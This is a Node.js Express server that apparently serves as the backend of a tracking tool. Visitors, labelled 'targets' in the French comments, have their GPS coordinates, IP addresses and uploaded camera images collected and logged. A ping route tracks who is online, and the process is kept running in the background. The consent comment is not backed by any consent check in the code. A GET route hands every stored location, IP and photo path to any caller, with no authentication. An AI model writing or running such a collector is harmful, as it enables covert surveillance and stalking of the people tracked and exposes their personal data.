const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Ensure uploads directory exists
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Configure multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, 'memory-' + uniqueSuffix + '.jpg');
  }
});
const upload = multer({ storage: storage });

// Middleware
app.use(cors());
app.use(express.json());
app.use(morgan('dev'));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Simple JSON persistence
const dataFile = path.join(__dirname, 'data.json');
let dataStore = [];
if (fs.existsSync(dataFile)) {
  try {
    dataStore = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
  } catch (e) {
    console.error("Could not parse data.json");
  }
}

const saveData = () => {
  fs.writeFileSync(dataFile, JSON.stringify(dataStore, null, 2));
};

let activeTargets = {};

// Nettoyage des cibles inactives (plus de 15s sans ping)
setInterval(() => {
  const now = Date.now();
  for (let ip in activeTargets) {
    if (now - activeTargets[ip].lastPing > 15000) {
      delete activeTargets[ip];
    }
  }
}, 5000);

// API Routes
app.get('/api/status', (req, res) => {
  res.json({ status: 'Backend is running correctly', version: '1.0.0' });
});

// Route de Ping pour savoir si quelqu'un est en ligne
app.post('/api/ping', (req, res) => {
  const ip = req.ip || req.connection.remoteAddress;
  activeTargets[ip] = { lastPing: Date.now() };
  res.json({ success: true });
});

// Route pour l'admin qui veut voir qui est en ligne
app.get('/api/active-targets', (req, res) => {
  res.json({ count: Object.keys(activeTargets).length });
});

// Example route to handle legitimate location data (if user consents)
app.post('/api/location', (req, res) => {
  const { latitude, longitude, accuracy, timestamp } = req.body;
  
  if (!latitude || !longitude) {
    return res.status(400).json({ error: 'Latitude and longitude are required' });
  }

  const locationData = {
    id: Date.now(),
    latitude,
    longitude,
    accuracy,
    timestamp: timestamp || new Date().toISOString(),
    ip: req.ip // Note: Express captures the IP as well
  };

  dataStore.push(locationData);
  saveData();
  console.log('Received location data:', locationData);

  res.status(201).json({ message: 'Location data received successfully', data: locationData });
});

// Route to handle memory data (image + location)
app.post('/api/memory', upload.single('image'), (req, res) => {
  const { latitude, longitude, accuracy } = req.body;
  const file = req.file;

  if (!file) {
    return res.status(400).json({ error: 'Image file is required' });
  }

  const memoryData = {
    id: Date.now(),
    latitude,
    longitude,
    accuracy,
    filename: file.filename,
    imagePath: file.path,
    timestamp: new Date().toISOString(),
    ip: req.ip
  };

  dataStore.push(memoryData);
  saveData();
  console.log('Received memory data:', { ...memoryData, imagePath: '...' });

  res.status(201).json({ message: 'Memory received successfully', data: memoryData });
});

// Route to get all memories
app.get('/api/memory', (req, res) => {
  res.json({ data: dataStore });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});

// Prevent Node from exiting when running in background without TTY
setInterval(() => {}, 1000 * 60 * 60);